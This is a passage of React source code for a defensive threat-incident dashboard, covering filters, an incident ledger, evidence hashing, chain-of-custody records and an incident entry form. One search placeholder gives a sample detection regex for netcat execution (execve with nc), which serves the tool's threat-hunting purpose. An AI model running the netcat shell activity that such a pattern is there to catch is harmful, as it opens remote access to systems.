                  className="bg-black border border-white/10 hover:border-white/20 focus:border-[#00f0ff] rounded px-2.5 py-1 text-zinc-200 focus:outline-none"
                />
              </div>

              <div className="flex items-center gap-2">
                <button
                  type="button"
                  onClick={() => {
                    const now = new Date();
                    const yesterday = new Date(Date.now() - 24 * 3600 * 1000);
                    setStartDate(yesterday.toISOString().slice(0, 16));
                    setEndDate(now.toISOString().slice(0, 16));
                  }}
                  className="px-2 py-1 rounded bg-white/5 hover:bg-white/10 text-zinc-300 text-[9px] uppercase font-bold cursor-pointer"
                >
                  Last 24h ISO
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setStartDate('');
                    setEndDate('');
                  }}
                  className="px-2 py-1 rounded bg-rose-950/20 text-rose-300 hover:bg-rose-950/40 text-[9px] uppercase font-bold cursor-pointer"
                >
                  Clear Custom Times
                </button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Control Filters panel: Search, Module, Severity, Status, MITRE ATT&CK, Sort */}
      <div className="bg-black/30 border-b border-white/5 p-4 space-y-3 select-none">
        <div className="grid grid-cols-1 md:grid-cols-12 gap-3">
          {/* Threat Hunter Query / Search Bar with Regex Toggle */}
          <div className="md:col-span-4 relative flex items-center">
            <span className="absolute left-2.5 text-[#00f0ff]">
              <Search size={12} />
            </span>
            <input
              type="text"
              placeholder={isRegexMode ? "Regex hunter syntax (e.g. /execve.*nc/i)..." : "Search payload, notes, IOCs, CVEs..."}
              value={searchQuery}
              onChange={(e) => setSearchQuery(e.target.value)}
              className={`w-full bg-black/80 border rounded pl-8 pr-16 py-1.5 text-zinc-200 placeholder-zinc-600 focus:outline-none font-mono text-[10px] transition-all ${
                regexError ? 'border-rose-500' : 'border-white/10 hover:border-white/20 focus:border-[#00f0ff]'
              }`}
            />
            {/* Regex Mode Toggle */}
            <button
              type="button"
              onClick={() => setIsRegexMode(!isRegexMode)}
              className={`absolute right-1.5 px-2 py-0.5 rounded text-[8.5px] font-bold tracking-wider uppercase transition-all cursor-pointer ${
                isRegexMode 
                  ? 'bg-[#00f0ff]/20 text-[#00f0ff] border border-[#00f0ff]/40' 
                  : 'bg-white/5 text-zinc-500 hover:text-zinc-300'
              }`}
              title="Toggle Regular Expression (Regex) searching"
            >
              .* REGEX
            </button>
          </div>

          {/* Module Selector */}
          <div className="md:col-span-8 grid grid-cols-1 sm:grid-cols-4 gap-2.5">
            {/* Category Dropdown */}
            <div className="relative flex flex-col justify-center bg-[#07070A] border border-white/10 p-1 rounded min-h-[30px]">
              {isCategoryDropdownOpen && (
                <div 
                  className="fixed inset-0 z-40 cursor-default" 
                  onClick={() => setIsCategoryDropdownOpen(false)} 
                />
              )}
              <div 
                onClick={() => {
                  setIsCategoryDropdownOpen(!isCategoryDropdownOpen);
                  setIsSeverityDropdownOpen(false);
                }}
                className="flex items-center justify-between gap-1 px-1 py-0.5 cursor-pointer text-zinc-200 text-[10px]"
              >
                <div className="flex items-center gap-1 overflow-hidden truncate">
                  <span className="text-[8px] text-white/40 uppercase font-bold">MODULE:</span>
                  <span className="truncate text-[#00f0ff] font-semibold">{categoryLabel}</span>
                </div>
                <ChevronRight 
                  size={10} 
                  className={`text-[#00f0ff] transition-transform duration-200 shrink-0 ${isCategoryDropdownOpen ? 'rotate-90' : ''}`} 
                />
              </div>

              <AnimatePresence>
                {isCategoryDropdownOpen && (
                  <motion.div
                    initial={{ opacity: 0, y: 4 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: 4 }}
                    className="absolute top-full left-0 right-0 z-50 mt-1 bg-[#0C0C12] border border-white/10 rounded shadow-2xl p-2 space-y-1.5"
                  >
                    <div className="flex items-center justify-between border-b border-white/5 pb-1 text-[8.5px] text-zinc-400">
                      <span>MODULE SOURCES</span>
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          if (categoryFilters.length === CATEGORY_OPTIONS.length) {
                            setCategoryFilters([]);
                          } else {
                            setCategoryFilters(CATEGORY_OPTIONS.map(o => o.id));
                          }
                        }}
                        className="text-[#00f0ff] hover:underline font-bold"
                      >
                        {categoryFilters.length === CATEGORY_OPTIONS.length ? "Clear" : "All"}
                      </button>
                    </div>
                    {CATEGORY_OPTIONS.map((opt) => {
                      const isChecked = categoryFilters.includes(opt.id);
                      return (
                        <label
                          key={opt.id}
                          className="flex items-center gap-1.5 px-1 py-0.5 hover:bg-white/5 rounded cursor-pointer text-zinc-300"
                          onClick={(e) => e.stopPropagation()}
                        >
                          <input
                            type="checkbox"
                            checked={isChecked}
                            onChange={() => {
                              if (isChecked) {
                                setCategoryFilters(categoryFilters.filter(c => c !== opt.id));
                              } else {
                                setCategoryFilters([...categoryFilters, opt.id]);
                              }
                            }}
                            className="accent-[#00f0ff] h-3 w-3 rounded"
                          />
                          <span>{opt.label}</span>
                        </label>
                      );
                    })}
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* Severity Dropdown */}
            <div className="relative flex flex-col justify-center bg-[#07070A] border border-white/10 p-1 rounded min-h-[30px]">
              {isSeverityDropdownOpen && (
                <div 
                  className="fixed inset-0 z-40 cursor-default" 
                  onClick={() => setIsSeverityDropdownOpen(false)} 
                />
              )}
              <div 
                onClick={() => {
                  setIsSeverityDropdownOpen(!isSeverityDropdownOpen);
                  setIsCategoryDropdownOpen(false);
                }}
                className="flex items-center justify-between gap-1 px-1 py-0.5 cursor-pointer text-zinc-200 text-[10px]"
              >
                <div className="flex items-center gap-1 overflow-hidden truncate">
                  <span className="text-[8px] text-white/40 uppercase font-bold">SEVERITY:</span>
                  <span className="truncate text-[#00f0ff] font-semibold">{severityLabel}</span>
                </div>
                <ChevronRight 
                  size={10} 
                  className={`text-[#00f0ff] transition-transform duration-200 shrink-0 ${isSeverityDropdownOpen ? 'rotate-90' : ''}`} 
                />
              </div>

              <AnimatePresence>
                {isSeverityDropdownOpen && (
                  <motion.div
                    initial={{ opacity: 0, y: 4 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0, y: 4 }}
                    className="absolute top-full left-0 right-0 z-50 mt-1 bg-[#0C0C12] border border-white/10 rounded shadow-2xl p-2 space-y-1.5"
                  >
                    <div className="flex items-center justify-between border-b border-white/5 pb-1 text-[8.5px] text-zinc-400">
                      <span>SEVERITY LEVELS</span>
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          if (severityFilters.length === SEVERITY_OPTIONS.length) {
                            setSeverityFilters([]);
                          } else {
                            setSeverityFilters(SEVERITY_OPTIONS.map(o => o.id));
                          }
                        }}
                        className="text-[#00f0ff] hover:underline font-bold"
                      >
                        {severityFilters.length === SEVERITY_OPTIONS.length ? "Clear" : "All"}
                      </button>
                    </div>
                    {SEVERITY_OPTIONS.map((opt) => {
                      const isChecked = severityFilters.includes(opt.id);
                      return (
                        <label
                          key={opt.id}
                          className="flex items-center gap-1.5 px-1 py-0.5 hover:bg-white/5 rounded cursor-pointer text-zinc-300"
                          onClick={(e) => e.stopPropagation()}
                        >
                          <input
                            type="checkbox"
                            checked={isChecked}
                            onChange={() => {
                              if (isChecked) {
                                setSeverityFilters(severityFilters.filter(s => s !== opt.id));
                              } else {
                                setSeverityFilters([...severityFilters, opt.id]);
                              }
                            }}
                            className="accent-[#00f0ff] h-3 w-3 rounded"
                          />
                          <span>{opt.label}</span>
                        </label>
                      );
                    })}
                  </motion.div>
                )}
              </AnimatePresence>
            </div>

            {/* MITRE ATT&CK Tactic Selector */}
            <div className="flex items-center gap-1 bg-[#07070A] border border-white/10 p-1 rounded min-h-[30px]">
              <span className="text-[8px] text-white/40 uppercase font-bold pl-1">MITRE:</span>
              <select
                value={mitreFilter}
                onChange={(e) => setMitreFilter(e.target.value)}
                className="bg-transparent text-[#00f0ff] text-[10px] font-mono focus:outline-none cursor-pointer flex-1 py-0.5"
              >
                {MITRE_TACTICS.map((tac) => (
                  <option key={tac} value={tac} className="bg-[#0A0A0E] text-zinc-200">
                    {tac}
                  </option>
                ))}
              </select>
            </div>

            {/* Sorting control */}
            <div className="flex items-center gap-1 bg-[#07070A] border border-white/10 p-1 rounded min-h-[30px]">
              <span className="text-[8px] text-white/40 uppercase font-bold pl-1">SORT:</span>
              <select
                value={sortBy}
                onChange={(e) => setSortBy(e.target.value as any)}
                className="bg-transparent text-zinc-200 text-[10px] font-mono focus:outline-none cursor-pointer flex-1 py-0.5 font-bold"
              >
                <option value="timestamp" className="bg-[#0A0A0E]">Timestamp (Newest)</option>
                <option value="severity" className="bg-[#0A0A0E]">Severity (High-Low)</option>
                <option value="category" className="bg-[#0A0A0E]">Category Grouping</option>
              </select>
            </div>
          </div>
        </div>

        {/* Regex Error message notice if typed pattern is invalid */}
        {regexError && (
          <div className="text-[9px] text-rose-400 font-mono bg-rose-950/20 px-2.5 py-1 rounded border border-rose-900/30 flex items-center gap-1.5">
            <AlertOctagon size={11} /> Invalid Regex Pattern: {regexError}
          </div>
        )}
      </div>

      {/* Main Split Layout: Incidents ledger on Left vs Detail metadata on Right */}
      <div className="grid grid-cols-1 lg:grid-cols-12 min-h-[500px]">
        {/* Left Side: Incidents ledger */}
        <div className="lg:col-span-7 bg-[#050508] border-r border-white/5 p-4 space-y-3 max-h-[560px] overflow-y-auto">
          <div className="flex items-center justify-between text-zinc-500 text-[9px] border-b border-dashed border-zinc-900 pb-1.5 mb-1 select-none">
            <span>
              DISPLAYING <strong className="text-zinc-200">{filteredThreats.length}</strong> OF {threats.length} ARCHIVED INCIDENT LOGS
            </span>
            <div className="space-x-2">
              <button 
                onClick={handleResetToSeeds}
                className="hover:text-[#00f0ff] transition-all cursor-pointer font-bold uppercase"
              >
                Reset Default specimens
              </button>
              <span>|</span>
              <button 
                onClick={handleClearEverything}
                className="hover:text-rose-400 transition-all cursor-pointer font-bold uppercase"
              >
                Purge All
              </button>
            </div>
          </div>

          {/* Multi-Select & AI Coprocessor Toolbar */}
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2.5 p-2 bg-black/50 border border-white/5 rounded-lg select-none">
            <div className="flex items-center gap-2">
              <input 
                type="checkbox"
                checked={filteredThreats.length > 0 && filteredThreats.every(t => selectedThreatIds.includes(t.id))}
                onChange={handleSelectAllVisible}
                className="accent-[#00f0ff] h-3.5 w-3.5 rounded border-white/10 bg-black cursor-pointer"
                id="select-all-visible-checkbox"
              />
              <label htmlFor="select-all-visible-checkbox" className="text-[9.5px] text-zinc-400 font-mono cursor-pointer">
                Select All Visible ({filteredThreats.length})
              </label>
            </div>
            <button
              type="button"
              onClick={handleGenerateAiReport}
              disabled={selectedThreatIds.length === 0}
              className="px-3 py-1 bg-[#00f0ff]/10 hover:bg-[#00f0ff]/20 disabled:opacity-30 border border-[#00f0ff]/30 disabled:border-white/5 rounded text-[9px] font-bold text-[#00f0ff] disabled:text-zinc-500 tracking-wider uppercase transition-all flex items-center justify-center gap-1.5 cursor-pointer"
            >
              <Sparkles size={11} className="shrink-0" /> Summarize ({selectedThreatIds.length}) with AI
            </button>
          </div>

          {/* Threat List Items */}
          {filteredThreats.length === 0 ? (
            <div className="py-24 text-center text-zinc-600 font-mono italic space-y-2">
              <p>&lt;No preserved security alerts found in active time window&gt;</p>
              <button
                type="button"
                onClick={() => { setDatePreset('ALL'); setSearchQuery(''); setMitreFilter('ALL'); }}
                className="text-[10px] text-[#00f0ff] hover:underline uppercase font-bold"
              >
                Reset All Filters to All Time
              </button>
            </div>
          ) : (
            <div className="space-y-2">
              <AnimatePresence initial={false}>
                {filteredThreats.map((threat) => {
                  const isSelected = selectedThreatId === threat.id;
                  const isChecked = selectedThreatIds.includes(threat.id);

                  return (
                    <motion.div
                      key={threat.id}
                      layout
                      initial={{ opacity: 0, y: 8 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, scale: 0.98 }}
                      transition={{ duration: 0.15 }}
                      onClick={() => setSelectedThreatId(threat.id)}
                      className={`group relative p-3 rounded-lg border transition-all cursor-pointer ${
                        isSelected 
                          ? 'bg-[#111118] border-[#00f0ff]/60 shadow-[0_0_20px_rgba(0,240,255,0.12)]' 
                          : 'bg-[#09090D] border-white/5 hover:border-white/15 hover:bg-[#0E0E14]'
                      }`}
                    >
                      <div className="flex items-start justify-between gap-2.5">
                        <div className="flex items-start gap-2.5 min-w-0 flex-1">
                          {/* Checkbox and Bookmark */}
                          <div className="flex flex-col items-center gap-1.5 pt-0.5 shrink-0" onClick={(e) => e.stopPropagation()}>
                            <input
                              type="checkbox"
                              checked={isChecked}
                              onChange={(e) => {
                                if (e.target.checked) {
                                  setSelectedThreatIds([...selectedThreatIds, threat.id]);
                                } else {
                                  setSelectedThreatIds(selectedThreatIds.filter(id => id !== threat.id));
                                }
                              }}
                              className="accent-[#00f0ff] h-3.5 w-3.5 rounded border-white/10 bg-black cursor-pointer"
                            />
                            <button
                              type="button"
                              onClick={(e) => handleToggleBookmark(threat.id, e)}
                              className={`p-0.5 rounded hover:bg-white/5 cursor-pointer ${
                                threat.isBookmarked ? 'text-amber-400' : 'text-zinc-600 hover:text-zinc-300'
                              }`}
                              title={threat.isBookmarked ? "Pinned High-Priority Threat" : "Pin threat"}
                            >
                              {threat.isBookmarked ? <BookmarkCheck size={12} /> : <Bookmark size={12} />}
                            </button>
                          </div>

                          <div className="space-y-1 flex-1 min-w-0">
                            {/* Tags and Badges Header */}
                            <div className="flex items-center gap-1.5 flex-wrap">
                              <span className={`text-[8px] uppercase font-bold px-1.5 py-0.5 rounded tracking-wide ${
                                threat.category === 'ebpf' 
                                  ? 'bg-fuchsia-950/30 text-fuchsia-400 border border-fuchsia-900/30' 
                                  : 'bg-sky-950/30 text-sky-400 border border-sky-900/30'
                              }`}>
                                {threat.category}
                              </span>
                              {getSeverityLabel(threat.severity)}
                              {getStatusLabel(threat.status)}

                              {threat.mitreTactic && (
                                <span className="text-[7.5px] uppercase font-bold px-1.5 py-0.5 rounded bg-blue-950/20 text-blue-300 border border-blue-900/30 truncate max-w-[150px]">
                                  {threat.mitreTactic.split('(')[0]}
                                </span>
                              )}
                            </div>
                            
                            <h4 className={`text-xs font-semibold leading-relaxed mt-0.5 ${isSelected ? 'text-zinc-100' : 'text-zinc-300'} truncate`}>
                              {threat.name}
                            </h4>

                            <p className="text-[10px] text-zinc-500 leading-relaxed font-mono truncate">
                              {threat.details}
                            </p>
                          </div>
                        </div>
                        
                        {/* Right side: Timestamp & Delete */}
                        <div className="flex flex-col items-end shrink-0 select-none space-y-1 ml-2">
                          <span 
                            className="text-[8.5px] text-zinc-400 font-mono font-semibold"
                            title={new Date(threat.timestamp).toLocaleString()}
                          >
                            {getRelativeTime(threat.timestamp)}
                          </span>
                          <span className="text-[7.5px] text-zinc-600 font-mono">
                            {threat.timestamp.split('T')[1].substring(0, 5)}Z
                          </span>
                          <button
                            onClick={(e) => {
                              e.stopPropagation();
                              handleDeleteThreat(threat.id);
                              setSelectedThreatIds(selectedThreatIds.filter(id => id !== threat.id));
                            }}
                            className="p-1 text-zinc-600 hover:text-rose-400 opacity-0 group-hover:opacity-100 transition-all rounded hover:bg-white/5 cursor-pointer mt-1"
                            title="Delete this record"
                          >
                            <Trash2 size={11} />
                          </button>
                        </div>
                      </div>
                    </motion.div>
                  );
                })}
              </AnimatePresence>
            </div>
          )}
        </div>

        {/* Right Side: Deep-Dive Forensic & Evidence Locker Pane */}
        <div className="lg:col-span-5 bg-black/30 flex flex-col p-5 overflow-y-auto max-h-[560px]">
          {activeThreat ? (
            <div className="space-y-4 flex-1 flex flex-col justify-between">
              <div className="space-y-3.5">
                {/* Header */}
                <div className="border-b border-white/5 pb-2.5 flex items-start justify-between gap-2">
                  <div>
                    <div className="text-[8px] font-bold tracking-wider text-white/40 uppercase flex items-center gap-1 select-none">
                      <Clock size={10} className="text-[#00f0ff]" /> INCIDENT ID: <strong className="text-[#00f0ff]">{activeThreat.id}</strong>
                    </div>
                    <h4 className="text-sm font-semibold text-zinc-100 mt-0.5 leading-snug">
                      {activeThreat.name}
                    </h4>
                    <p className="text-[9px] text-zinc-500 font-mono mt-0.5">
                      Logged: {new Date(activeThreat.timestamp).toUTCString()} ({getRelativeTime(activeThreat.timestamp)})
                    </p>
                  </div>
                  <button
                    type="button"
                    onClick={(e) => handleToggleBookmark(activeThreat.id, e)}
                    className={`p-1.5 rounded border transition-all cursor-pointer ${
                      activeThreat.isBookmarked 
                        ? 'bg-amber-500/20 border-amber-500/40 text-amber-300' 
                        : 'bg-white/5 border-white/10 text-zinc-400 hover:text-white'
                    }`}
                    title={activeThreat.isBookmarked ? "Pinned High-Priority Threat" : "Pin threat"}
                  >
                    <Bookmark size={13} />
                  </button>
                </div>

                {/* Narrative Details */}
                <div className="space-y-1">
                  <div className="text-[8px] text-zinc-400 font-bold uppercase tracking-wider select-none">Narrative Details</div>
                  <p className="text-zinc-300 text-[11px] leading-relaxed select-all">
                    {activeThreat.details}
                  </p>
                </div>

                {/* MITRE ATT&CK Mapping Pill */}
                {activeThreat.mitreTactic && (
                  <div className="bg-[#09090E] border border-blue-900/30 rounded p-2.5 space-y-1 select-none">
                    <div className="text-[8px] text-blue-400 font-bold uppercase tracking-wider flex items-center gap-1">
                      <ShieldCheck size={11} /> MITRE ATT&CK Classification
                    </div>
                    <div className="flex flex-wrap gap-2 text-[9.5px]">
                      <span className="text-zinc-300">Tactic: <strong className="text-blue-300">{activeThreat.mitreTactic}</strong></span>
                      {activeThreat.mitreTechnique && (
                        <span>Technique: <strong className="text-[#00f0ff]">{activeThreat.mitreTechnique}</strong></span>
                      )}
                    </div>
                  </div>
                )}

                {/* Raw Execution Payload Box with Defang Toggle */}
                <div className="space-y-1">
                  <div className="text-[8px] text-zinc-400 font-bold uppercase tracking-wider flex items-center justify-between select-none">
                    <span>Raw Execution Context / Syscall Args</span>
                    <button
                      type="button"
                      onClick={() => setDefangDetailPayload(!defangDetailPayload)}
                      className="text-[7.5px] uppercase text-[#00f0ff] hover:underline cursor-pointer"
                    >
                      {defangDetailPayload ? "[Defanged: ON]" : "[Defang: OFF]"}
                    </button>
                  </div>
                  <div className="bg-black border border-white/5 rounded p-2.5 text-rose-300 leading-normal text-[10px] max-h-24 overflow-y-auto whitespace-pre overflow-x-auto select-all font-mono">
                    <code>
                      {defangDetailPayload
                        ? activeThreat.rawPayload.replace(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g, (ip) => ip.replace(/\./g, '[.]'))
                        : activeThreat.rawPayload}
                    </code>
                  </div>
                </div>

                {/* Cryptographic Evidence Seal */}
                <div className="bg-black/60 border border-white/5 rounded p-2.5 flex items-center justify-between gap-2 text-[9px] select-none">
                  <div className="space-y-0.5">
                    <span className="text-[8px] text-zinc-500 uppercase font-bold flex items-center gap-1">
                      <Hash size={10} className="text-purple-400" /> Evidence Seal (SHA-256)
                    </span>
                    <div className="text-purple-300 font-mono text-[8.5px] truncate max-w-xs">
                      {CryptoJS.SHA256(activeThreat.rawPayload + activeThreat.timestamp).toString()}
                    </div>
                  </div>
                  <span className="px-2 py-0.5 rounded bg-emerald-950/20 border border-emerald-500/30 text-emerald-400 text-[8px] uppercase font-bold shrink-0">
                    SEALED
                  </span>
                </div>

                {/* Officer & Status Controls */}
                <div className="grid grid-cols-2 gap-2.5 bg-[#0B0B0E] border border-white/5 rounded p-2.5 select-none">
                  <div>
                    <span className="block text-[8px] text-white/40 uppercase">Assigned Officer</span>
                    <span className="text-zinc-300 block mt-0.5 text-[10px] select-all flex items-center gap-1">
                      <User size={10} className="text-[#00f0ff]" /> {activeThreat.assignedOfficer || "Unassigned"}
                    </span>
                  </div>
                  <div>
                    <span className="block text-[8px] text-white/40 uppercase mb-1">State Classification</span>
                    <select
                      value={activeThreat.status}
                      onChange={(e) => handleUpdateStatus(e.target.value as ArchivedThreat['status'])}
                      className="bg-black border border-white/10 rounded px-2 py-1 text-[9.5px] text-[#00f0ff] font-mono focus:outline-none cursor-pointer w-full font-bold"
                    >
                      <option value="Unresolved">Unresolved</option>
                      <option value="Triaged">Triaged</option>
                      <option value="Remediated">Remediated</option>
                      <option value="False Positive">False Positive</option>
                    </select>
                  </div>
                </div>

                {/* Chain of Custody Audit Trail */}
                <div className="space-y-1.5 border-t border-white/5 pt-2.5">
                  <div className="flex items-center justify-between select-none">
                    <span className="text-[8px] text-zinc-400 font-bold uppercase tracking-wider flex items-center gap-1">
                      <ShieldAlert size={10} className="text-[#00f0ff]" /> Chain of Custody ({activeThreat.chainOfCustody?.length || 0})
                    </span>
                    <button
                      type="button"
                      onClick={() => setIsAddingCustody(!isAddingCustody)}
                      className="text-[8.5px] text-[#00f0ff] hover:underline uppercase font-bold cursor-pointer"
                    >
                      {isAddingCustody ? "Close" : "+ Add Custody Entry"}
                    </button>
                  </div>

                  {/* Add Custody Entry Form */}
                  <AnimatePresence>
                    {isAddingCustody && (
                      <motion.form
                        initial={{ opacity: 0, height: 0 }}
                        animate={{ opacity: 1, height: 'auto' }}
                        exit={{ opacity: 0, height: 0 }}
                        onSubmit={handleAddCustodyRecord}
                        className="bg-black/80 border border-white/10 rounded p-2.5 space-y-2 text-[10px]"
                      >
                        <div>
                          <label className="text-[8px] text-zinc-400 uppercase font-bold block mb-1">Action / Handover Description</label>
                          <input
                            type="text"
                            required
                            placeholder="e.g. Evidence payload transferred to malware sandbox..."
                            value={custodyAction}
                            onChange={(e) => setCustodyAction(e.target.value)}
                            className="w-full bg-black border border-white/10 rounded px-2 py-1 text-zinc-200 focus:outline-none focus:border-[#00f0ff]"
                          />
                        </div>
                        <div className="flex items-center justify-between gap-2">
                          <input
                            type="text"
                            value={custodyOfficer}
                            onChange={(e) => setCustodyOfficer(e.target.value)}
                            placeholder="Investigator signature..."
                            className="bg-black border border-white/10 rounded px-2 py-1 text-zinc-400 text-[9px] flex-1 focus:outline-none"
                          />
                          <button
                            type="submit"
                            className="px-3 py-1 bg-[#00f0ff] text-black font-bold uppercase text-[9px] rounded cursor-pointer"
                          >
                            Seal Entry
                          </button>
                        </div>
                      </motion.form>
                    )}
                  </AnimatePresence>

                  {/* Custody History Timeline */}
                  {activeThreat.chainOfCustody && activeThreat.chainOfCustody.length > 0 ? (
                    <div className="space-y-1.5 max-h-24 overflow-y-auto">
                      {activeThreat.chainOfCustody.map((entry, idx) => (
                        <div key={idx} className="bg-black/40 border border-white/5 rounded p-2 text-[9px] space-y-0.5">
                          <div className="flex items-center justify-between text-zinc-500">
                            <span className="text-zinc-300 font-semibold">{entry.investigator}</span>
                            <span>{new Date(entry.timestamp).toLocaleTimeString()}</span>
                          </div>
                          <div className="text-zinc-400">{entry.action}</div>
                          {entry.hashProof && (
                            <div className="text-[7.5px] text-purple-400 font-mono truncate">
                              Proof: {entry.hashProof}
                            </div>
                          )}
                        </div>
                      ))}
                    </div>
                  ) : (
                    <div className="text-[9px] text-zinc-600 italic">No external chain-of-custody handovers logged yet.</div>
                  )}
                </div>

                {/* Persistent Annotations & Notes */}
                <div className="space-y-1.5 border-t border-white/5 pt-2.5">
                  <div className="flex items-center justify-between select-none">
                    <span className="text-[8px] text-zinc-400 font-bold uppercase tracking-wider flex items-center gap-1">
                      <FileText size={10} className="text-[#00f0ff]" /> Investigator Notes
                    </span>
                    {!isEditingNotes ? (
                      <button
                        onClick={() => setIsEditingNotes(true)}
                        className="text-[8.5px] text-[#00f0ff] hover:underline uppercase font-bold flex items-center gap-0.5 cursor-pointer"
                      >
                        <Edit3 size={9} /> Edit
                      </button>
                    ) : (
                      <div className="space-x-2">
                        <button
                          onClick={handleSaveNotes}
                          className="text-[8.5px] text-emerald-400 hover:underline uppercase font-bold cursor-pointer"
                        >
                          Save
                        </button>
                        <button
                          onClick={() => {
                            setEditingNotes(activeThreat.notes || '');
                            setIsEditingNotes(false);
                          }}
                          className="text-[8.5px] text-zinc-500 hover:underline uppercase font-bold cursor-pointer"
                        >
                          Cancel
                        </button>
                      </div>
                    )}
                  </div>

                  {!isEditingNotes ? (
                    <div className="bg-black/50 border border-white/5 p-2.5 rounded text-zinc-300 text-[10px] select-all italic whitespace-pre-wrap font-mono leading-relaxed">
                      {activeThreat.notes ? activeThreat.notes : "No annotations logged yet for this incident file."}
                    </div>
                  ) : (
                    <textarea
                      value={editingNotes}
                      onChange={(e) => setEditingNotes(e.target.value)}
                      placeholder="Input custom forensic assessments or remediation comments..."
                      className="w-full bg-black border border-white/10 focus:border-[#00f0ff] rounded p-2 text-zinc-200 min-h-16 focus:outline-none font-mono text-[10px]"
                    />
                  )}
                </div>
              </div>

              {/* Hardware TEE Attestation seal */}
              <div className="border-t border-white/5 pt-3 mt-3 select-none">
                <div className="flex items-center gap-1.5 text-zinc-600 text-[8.5px] font-mono">
                  <Sparkles size={11} className="text-[#00f0ff]" /> Intel SGX / AMD SEV Cryptographic Enclave Verified
                </div>
              </div>
            </div>
          ) : (
            <div className="flex-1 flex flex-col justify-center items-center text-center p-8 select-none text-zinc-650 font-mono italic">
              <ShieldAlert size={28} className="text-zinc-700 mb-2.5" />
              <span>Select any archived incident spec line from the ledger index to inspect deeper forensic metadata, chain of custody, and add notes.</span>
            </div>
          )}
        </div>
      </div>

      {/* Slide-over form for Adding a Manual Incident Alert */}
      <AnimatePresence>
        {isAddingNew && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsAddingNew(false)}
              className="absolute inset-0 bg-black/85 backdrop-blur-sm cursor-pointer"
            />
            
            <motion.div 
              initial={{ scale: 0.95, opacity: 0, y: 15 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.95, opacity: 0, y: 15 }}
              className="relative w-full max-w-xl bg-[#09090D] border border-white/10 rounded-xl shadow-2xl p-6 space-y-4 z-10 font-mono text-[11px]"
            >
              <div className="flex items-center justify-between border-b border-white/5 pb-2.5">
                <h4 className="text-xs font-semibold text-zinc-100 flex items-center gap-1.5 select-none">
                  <Plus size={13} className="text-[#00f0ff]" /> File Manual Threat Incident Log
                </h4>
                <button
                  onClick={() => setIsAddingNew(false)}
                  className="p-1 rounded text-zinc-500 hover:text-white hover:bg-white/5 cursor-pointer"
                >
                  <X size={13} />
                </button>
              </div>

              <form onSubmit={handleCreateNewThreat} className="space-y-3">
                <div className="space-y-1">
                  <label className="text-[8.5px] text-zinc-400 uppercase tracking-wider font-bold">Threat Title</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. Reverse socket pipe execution flagged"
                    value={newTitle}
                    onChange={(e) => setNewTitle(e.target.value)}
                    className="w-full bg-black border border-white/10 focus:border-[#00f0ff] focus:outline-none rounded px-3 py-1.5 text-zinc-200"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div className="space-y-1">
                    <label className="text-[8.5px] text-zinc-400 uppercase tracking-wider font-bold">Log Source Module</label>
                    <select
                      value={newCategory}
                      onChange={(e) => setNewCategory(e.target.value as 'ebpf' | 'ast')}
                      className="w-full bg-black border border-white/10 focus:border-[#00f0ff] focus:outline-none rounded px-2.5 py-1.5 text-zinc-200 cursor-pointer"
                    >
                      <option value="ebpf">eBPF Kernel Telemetry</option>
                      <option value="ast">Heuristic AST Static Scan</option>
                    </select>
                  </div>

                  <div className="space-y-1">
                    <label className="text-[8.5px] text-zinc-400 uppercase tracking-wider font-bold">Classification Severity</label>
                    <select
                      value={newSeverity}
                      onChange={(e) => setNewSeverity(e.target.value as 'low' | 'medium' | 'high')}
                      className="w-full bg-black border border-white/10 focus:border-[#00f0ff] focus:outline-none rounded px-2.5 py-1.5 text-zinc-200 cursor-pointer font-bold"
                    >
                      <option value="high">Critical</option>
                      <option value="medium">Medium</option>
                      <option value="low">Low</option>
                    </select>
                  </div>
                </div>

                <div className="space-y-1">
                  <label className="text-[8.5px] text-zinc-400 uppercase tracking-wider font-bold">MITRE ATT&CK Tactic</label>
                  <select
                    value={newMitreTactic}
                    onChange={(e) => setNewMitreTactic(e.target.value)}
                    className="w-full bg-black border border-white/10 focus:border-[#00f0ff] focus:outline-none rounded px-2.5 py-1.5 text-zinc-200 cursor-pointer"
                  >
                    {MITRE_TACTICS.filter(t => t !== 'ALL').map(tac => (
                      <option key={tac} value={tac}>{tac}</option>
                    ))}
                  </select>
                </div>

                <div className="space-y-1">
                  <label className="text-[8.5px] text-zinc-400 uppercase tracking-wider font-bold">Detailed Description Narrative</label>
                  <textarea
                    required
                    rows={2}
                    placeholder="Describe intercepted behavior, anomalies, or suspicious parameters..."
                    value={newDetails}
                    onChange={(e) => setNewDetails(e.target.value)}
                    className="w-full bg-black border border-white/10 focus:border-[#00f0ff] focus:outline-none rounded px-3 py-1.5 text-zinc-200 leading-normal"
                  />
                </div>

                <div className="space-y-1">
                  <label className="text-[8.5px] text-zinc-400 uppercase tracking-wider font-bold">Raw Payload Stream / Syscall Dump</label>
                  <textarea
                    rows={2}
                    placeholder="Raw execution command, syscall invocation parameters, or code fragment..."
                    value={newRawPayload}
                    onChange={(e) => setNewRawPayload(e.target.value)}
                    className="w-full bg-black border border-white/10 focus:border-[#00f0ff] focus:outline-none rounded px-3 py-1.5 text-rose-300 font-mono text-[10px]"
                  />
                </div>

                <div className="flex justify-end gap-2.5 pt-2 border-t border-white/5">
                  <button
                    type="button"
                    onClick={() => setIsAddingNew(false)}
                    className="px-4 py-1.5 rounded bg-white/5 hover:bg-white/10 text-zinc-400 hover:text-white uppercase font-bold text-[9px] cursor-pointer"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="px-4 py-1.5 rounded bg-[#00f0ff] text-black font-bold uppercase text-[9px] cursor-pointer hover:bg-[#33f3ff]"
                  >
                    Preserve to Database
                  </button>
                </div>
              </form>
